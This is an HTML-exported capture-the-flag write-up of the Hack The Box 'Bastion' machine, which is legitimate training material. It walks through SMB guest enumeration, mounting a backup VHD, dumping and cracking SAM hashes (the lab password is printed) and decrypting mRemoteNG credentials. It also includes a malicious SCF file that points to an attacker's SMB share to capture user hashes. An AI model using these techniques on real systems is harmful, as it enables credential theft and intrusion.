<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol.lst-kix_ohdy2s83x4k8-5.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-5 0}.lst-kix_ohdy2s83x4k8-7>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-7}ol.lst-kix_ohdy2s83x4k8-0.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-0 0}.lst-kix_ohdy2s83x4k8-7>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-7,lower-latin) ". "}.lst-kix_ohdy2s83x4k8-8>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-8,lower-roman) ". "}.lst-kix_ohdy2s83x4k8-8>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-8}ol.lst-kix_ohdy2s83x4k8-7.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-7 0}ol.lst-kix_ohdy2s83x4k8-2.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-2 0}.lst-kix_ohdy2s83x4k8-1>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-1}.lst-kix_ohdy2s83x4k8-4>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-4}ol.lst-kix_ohdy2s83x4k8-2{list-style-type:none}ol.lst-kix_ohdy2s83x4k8-3{list-style-type:none}.lst-kix_ohdy2s83x4k8-3>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-3}ol.lst-kix_ohdy2s83x4k8-4.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-4 0}.lst-kix_ohdy2s83x4k8-6>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-6}ol.lst-kix_ohdy2s83x4k8-0{list-style-type:none}ol.lst-kix_ohdy2s83x4k8-1{list-style-type:none}ol.lst-kix_ohdy2s83x4k8-6.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-6 0}.lst-kix_ohdy2s83x4k8-1>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-1,lower-latin) ". "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_ohdy2s83x4k8-0>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-0}.lst-kix_ohdy2s83x4k8-0>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-0,decimal) ". "}ol.lst-kix_ohdy2s83x4k8-1.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-1 0}.lst-kix_ohdy2s83x4k8-5>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-5}ol.lst-kix_ohdy2s83x4k8-8.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-8 0}.lst-kix_ohdy2s83x4k8-3>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-3,decimal) ". "}.lst-kix_ohdy2s83x4k8-5>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-5,lower-roman) ". "}.lst-kix_ohdy2s83x4k8-2>li{counter-increment:lst-ctn-kix_ohdy2s83x4k8-2}.lst-kix_ohdy2s83x4k8-2>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-2,lower-roman) ". "}.lst-kix_ohdy2s83x4k8-6>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-6,decimal) ". "}ol.lst-kix_ohdy2s83x4k8-3.start{counter-reset:lst-ctn-kix_ohdy2s83x4k8-3 0}ol.lst-kix_ohdy2s83x4k8-6{list-style-type:none}ol.lst-kix_ohdy2s83x4k8-7{list-style-type:none}ol.lst-kix_ohdy2s83x4k8-4{list-style-type:none}ol.lst-kix_ohdy2s83x4k8-5{list-style-type:none}ol.lst-kix_ohdy2s83x4k8-8{list-style-type:none}.lst-kix_ohdy2s83x4k8-4>li:before{content:"" counter(lst-ctn-kix_ohdy2s83x4k8-4,lower-latin) ". "}ol{margin:0;padding:0}table td,table th{padding:0}.c0{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c7{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c12{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c9{color:inherit;text-decoration:inherit}.c4{margin-left:36pt;padding-left:0pt}.c11{padding:0;margin:0}.c5{height:11pt}.c1{font-weight:700}.c10{margin-left:18pt}.c6{color:#ff0000}.c8{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c12"><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 143.50px; height: 143.50px;"><img alt="" src="images/image12.png" style="width: 143.50px; height: 143.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 104.00px;"><img alt="" src="images/image21.png" style="width: 624.00px; height: 104.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span>This was an amazing box that really showed the importance of using google. It was unique in that it did not have a web server port. The great thing about this box is that it was very realistic, as intended by the author </span><span class="c1">L4mpje</span><span class="c3">. Let&rsquo;s get right into it!</span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span>As usual, I added the ip to my /etc/hosts file and called it bastion.htb. Afterwards, I ran the normal </span><span class="c1">nmap -sC -sV -oA nmap/nmap bastion.htb</span><span>&nbsp;which revealed many ports. Just to be sure that I had all the ports, I ran </span><span class="c1">nmap -p- --max-retries=0 bastion.htb</span><span>. Note the max-retries flag which, when set to 0, performs the scan at it&rsquo;s quickest but most unreliable speed. This is because the max-retries flag is used to specify the maximum port scan probe retransmissions, and the less transmissions you send, the higher likelihood that you will have false negatives and positives. After scanning all ports, the following ports were revealed: </span><span class="c1">47001,49664,49665,49666,49667,49668,49669,49670</span><span>. Due to this, I ran the thorough nmap scan once again (this time specifying the ports): </span><span class="c0">nmap -sC -sV -oA nmap/nmap -p 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 bastion.htb</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 549.33px;"><img alt="" src="images/image4.png" style="width: 624.00px; height: 549.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>Looks like the high ports that the </span><span class="c1">nmap -p- </span><span class="c3">command found were of no importance. Looking at the results however, two ports in particular stand out. This Windows box is running ssh!? That&rsquo;s certainly strange as I have not seen any other Windows box with ssh (more on this later). The other port that stands out is port 445 (Samba a.k.a SMB which stands for Server Message Block), and it is configured to allow guest access. This seems like the most obvious attack vector, so let&rsquo;s see what we find. </span></p><p class="c2"><span class="c0">smbmap -H bastion.htb -u guest</span></p><p class="c2 c5"><span class="c0"></span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 136.00px;"><img alt="" src="images/image3.png" style="width: 624.00px; height: 136.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>Again, two things in this output stand out. First of all, there is a </span><span class="c1">Backups </span><span>directory which we have READ and WRITE access to. The fact that we have WRITE access to this is a huge </span><span class="c6">red flag</span><span class="c3">! This means that we could drop a malicious SCF (shell command file) to potentially steal hashes from users who access this file. We can write a .scf file with the following contents:</span></p><p class="c2 c5"><span class="c0"></span></p><p class="c2"><span class="c0">[Shell]</span></p><p class="c2"><span class="c0">Command=2</span></p><p class="c2"><span class="c0">IconFile=\\10.13.37.2\share\0xd4y.ico</span></p><p class="c2"><span class="c0">[Taskbar]</span></p><p class="c2"><span class="c0">Command=ToggleDesktop</span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span>Whenever a user browses to this file, Windows will attempt to authenticate to our share with the credentials of the user, meaning that we can capture these credentials (albeit the password is hashed). The fact that we have write access to a directory containing backups is especially alarming, as which users would normally access such a directory? Probably domain admins. There is an excellent article on this topic that I highly recommend you read (</span><span class="c7"><a class="c9" href="https://www.google.com/url?q=https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&amp;sa=D&amp;source=editors&amp;ust=1653959269091618&amp;usg=AOvVaw0pGdwROOMk11BRZjNFPYMF">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></span><span class="c3">). Anyways, this is most likely not intended by the author because Bastion is an easy box and there are no real users on the system to execute the .scf file (as this is just a box rather than a real attack). </span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span class="c3">The other thing that stands out is this smbmap message: </span></p><p class="c2"><span class="c0">[\] Work[!] Unable to remove test directory at \\bastion.htb\Backups\GZHGUJOWDT, please remove manually</span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span>The smbmap tool knows that we have write access to </span><span class="c1">\Backups</span><span>&nbsp;because it was able to write to it. However, the fact that it was not able to remove it shows that this created directory could be a way for defenders to find out that someone may be up to something malicious. In a real penetration testing environment, it may be more wise to use </span><span class="c1">smbclient -L -U guest bastion.htb</span><span class="c3">&nbsp;which lists the shares, but does not list the permissions:</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 252.00px;"><img alt="" src="images/image17.png" style="width: 624.00px; height: 252.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>Ok, enough stalling. Let&#39;s just see what&rsquo;s inside this</span><span class="c1">&nbsp;\Backups </span><span>directory. I created a </span><span class="c1">/smb</span><span>&nbsp;directory on my machine (so that if I download a file it goes straight to the </span><span class="c1">/smb </span><span class="c3">directory) and connected to the SMB share: </span></p><p class="c2"><span class="c0">smbclient -U guest //bastion.htb/Backups</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 258.67px;"><img alt="" src="images/image6.png" style="width: 624.00px; height: 258.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>I downloaded the note.txt file using </span><span class="c1">get note.txt</span><span class="c3">&nbsp;and viewed it on my host machine.</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 56.00px;"><img alt="" src="images/image20.png" style="width: 624.00px; height: 56.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">This file is a hint that there is probably a large backup file somewhere in this SMB share. Let&rsquo;s keep enumerating! Eventually you&rsquo;ll find the following directory:</span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 181.33px;"><img alt="" src="images/image14.png" style="width: 624.00px; height: 181.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span>Incidentally, we know that there is probably a user named L4mpje on the system (it is always important to save information like this in a file where you keep your notes). Two files here stand out (first there were two ports that stood out, then two interesting things with the SMB share, now this...why are there always two things that stand out??). The </span><span class="c1">.vhd </span><span>(virtual hard disk) files are quite conspicuous; these files are absolutely massive! One is about 37MB while the other one is 5.4GB and are no doubt the backup files that the </span><span class="c1">note.txt</span><span class="c3">&nbsp;message was referring to. I foolishly downloaded both files and inspected them when I was first going through this machine, so let&rsquo;s see how to view these files without waiting a million years for them to finish installing.</span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span>The mount command does the trick. Running the command </span><span class="c1">sudo mount -t cifs //bastion.htb/Backups smb/ -o username=guest</span><span>&nbsp;we see the full listing of the directory Backups. The </span><span class="c1">-t </span><span class="c3">option for mount specifies the type of file share we want to mount. CIFS stands for Common Internet File System and is a dialect, or particular implementation, of the SMB protocol.</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 122.67px;"><img alt="" src="images/image10.png" style="width: 624.00px; height: 122.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">Note the strange directory names that smbmap created. Anyways, let&#39;s get right to the .vhd files. </span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 166.67px;"><img alt="" src="images/image15.png" style="width: 624.00px; height: 166.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">When I was first going through this box, I mounted both the .vhd files, but the 37MB one is not interesting as it just has boot files. Let&rsquo;s mount the .vhd file and inspect its contents.</span></p><p class="c2"><span class="c0">guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 --ro ~/business/hackthebox/easy/windows/bastion/mnt/</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 54.67px;"><img alt="" src="images/image2.png" style="width: 624.00px; height: 54.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>And we get a whole listing of files. At this point, I looked through a ton of data, but I couldn&rsquo;t find anything interesting laying around. However, there is still a way to extract credentials due to a huge oversight of the sysadmins. They accidentally backed up the files </span><span class="c1">SYSTEM </span><span>and </span><span class="c1">SAM </span><span>(Security Account Manager) located in </span><span class="c1">/Windows/System32/config</span><span class="c3">. </span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 62.67px;"><img alt="" src="images/image16.png" style="width: 624.00px; height: 62.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>So the note really wasn&rsquo;t kidding when it said to not transfer the entire backup file locally. A lazy sysadmin did not realize that he backed up even the </span><span class="c1">SAM </span><span>and </span><span class="c1">SYSTEM </span><span>file. </span><span class="c6">THESE FILES ARE HIGHLY SENSITIVE!!!</span><span class="c1 c6">&nbsp;</span><span>The SAM file is a database file that stores credentials of the local users. These credentials are hashed and encrypted by the system boot key which is located in </span><span class="c1">SYSTEM</span><span>. This means that if you have access to the </span><span class="c1">SYSTEM</span><span class="c3">&nbsp;file, then you can decrypt the credentials revealing their hashes.</span></p><p class="c2"><span class="c3">.</span></p><p class="c2"><span>We can use the </span><span class="c1">impacket-secretsdump</span><span>&nbsp;tool to extract hashed credentials. Let&rsquo;s copy these files to our root directory (</span><span class="c1">/bastion</span><span class="c3">) and continue with the command. </span></p><p class="c2"><span class="c0">impacket-secretsdump -sam SAM -system SYSTEM local</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 162.67px;"><img alt="" src="images/image11.png" style="width: 624.00px; height: 162.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">Well, now we have the hash for the L4mpje user! Notice how Administrator and Guest have blank LM and NTLM hashes. This indicates that Administrator and Guest were most likely disabled when this file was backed up (even more evidence that this was probably backed up with the SYSTEM user), but this could be an old backup file and Administrator could have been activated since then. Anyways, let&rsquo;s copy the NTLM hash of L4mpje and crack it.</span></p><p class="c2"><span class="c0">hashcat -m 1000 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt</span></p><p class="c2 c5"><span class="c3"></span></p><p class="c2"><span>After about a minute, the NTLM hash is cracked revealing that L4mpje&rsquo;s password is </span><span class="c1">bureaulampje</span><span class="c3">.</span></p><p class="c2 c5"><span class="c0"></span></p><p class="c2"><span class="c0">Tip: </span></p><p class="c2 c10"><span class="c3">Using Hashcat on a virtual machine is not recommended. Hashcat runs a lot quicker on &nbsp; your host machine. </span></p><p class="c2 c5 c10"><span class="c3"></span></p><p class="c2"><span class="c3">Let&rsquo;s ssh into the box and hope that L4mpje has not updated his password since the .vhd file was backed up.</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 168.00px;"><img alt="" src="images/image5.png" style="width: 624.00px; height: 168.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">It was expected that L4mpje did not change his password. Not because this is meant to be a vulnerable machine, but this is completely realistic. How often does a person change his password? </span></p><p class="c2"><span>We can now grab user.txt, but how are we going to escalate to administrator? This is where having knowledge on the basic file system of Windows is useful. After a lot of enumeration, you will notice that there is a particular directory on this box which stands out on </span><span class="c1">C:\Program Files (x86):</span><span class="c3">&nbsp;</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 481.33px;"><img alt="" src="images/image9.png" style="width: 624.00px; height: 481.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">The mRemoteNG directory is not part of the default Windows build. Let&rsquo;s inspect it further.</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 615.00px; height: 838.00px;"><img alt="" src="images/image7.png" style="width: 615.00px; height: 838.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">Nothing in this directory looks out of the ordinary. In any case, we should look into this for multiple reasons:</span></p><ol class="c11 lst-kix_ohdy2s83x4k8-0 start" start="1"><li class="c2 c4 li-bullet-0"><span class="c3">mRemoteNG is a tool for connecting and managing remote systems (protocols such as SSH, RDP, etc. are used). </span></li><li class="c2 c4 li-bullet-0"><span class="c3">mRemoteNG is not part of the default Windows build.</span></li><li class="c2 c4 li-bullet-0"><span class="c3">This box is called Bastion, hinting at the possibility that this box is a bastion host. A bastion host allows external connections to a private network. Due to the increased probability of an attack on a bastion host, it must be hardened to withstand such attacks. As such, typically there are very few services running on a bastion host (in our case the bastion host is running SSH and an SMB share). Ideally, a bastion host acts as a jump server once a connection has been established to it (a jump server is used to access devices in a separate security zone). Essentially, this means after connecting to a bastion host, authorized users can have access to private instances located within the virtual private cloud (VPC).Think of a bastion host as a bastion is in real life (hence the name). You can walk up to the bastion, knock on the castle walls, but you are not allowed inside unless you are authorized. If you attack the bastion, you may be met with defensive fire.</span></li></ol><p class="c2 c8"><span class="c1">(BLACKLISTED!)</span><span class="c3">.</span></p><p class="c2 c8"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 240.00px; height: 180.00px;"><img alt="" src="images/image1.png" style="width: 240.00px; height: 180.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>After a bit of googling, you will find a great article explaining the insecurity of mRemoteNG (</span><span class="c7"><a class="c9" href="https://www.google.com/url?q=https://hackersvanguard.com/mremoteng-insecure-password-storage/&amp;sa=D&amp;source=editors&amp;ust=1653959269099144&amp;usg=AOvVaw3-pbufm1UKT3DrQduFTOtr">https://hackersvanguard.com/mremoteng-insecure-password-storage/</a></span><span>). The ConfCons.xml file located in </span><span class="c1">%AppData%\mRemoteNG</span><span class="c3">&nbsp;contains encrypted passwords for users on the system. Let&rsquo;s reveal the contents:</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 77.33px;"><img alt="" src="images/image8.png" style="width: 624.00px; height: 77.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">This password seems to simply just be base64 encoded, but when we decode it, we just get garbage:</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 38.67px;"><img alt="" src="images/image18.png" style="width: 624.00px; height: 38.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>This suggests that the password is most likely encrypted. Luckily, there are many different ways to decrypt mRemoteNG passwords (I used this tool on github: </span><span class="c7"><a class="c9" href="https://www.google.com/url?q=https://github.com/kmahyyg/mremoteng-decrypt&amp;sa=D&amp;source=editors&amp;ust=1653959269099982&amp;usg=AOvVaw025QHY47XDkVrWrOY0p2AP">https://github.com/kmahyyg/mremoteng-decrypt</a></span><span class="c3">).</span></p><p class="c2"><span class="c3">Using this tool and inputting the encrypted password of Administrator we get the credentials:</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 32.00px;"><img alt="" src="images/image13.png" style="width: 624.00px; height: 32.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span class="c3">We can now ssh into Administrator and get root.txt!</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 424.00px;"><img alt="" src="images/image19.png" style="width: 624.00px; height: 424.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2"><span>There were many things learned in this box. I really appreciate the work </span><span class="c1">L4mpje</span><span class="c3">&nbsp;did on creating this challenge. It was completely realistic, and I loved it beginning to end. Thanks also to you for reading my writeup, and I hope you learned from this box as much as I did!</span></p><p class="c2 c5"><span class="c3"></span></p></body></html>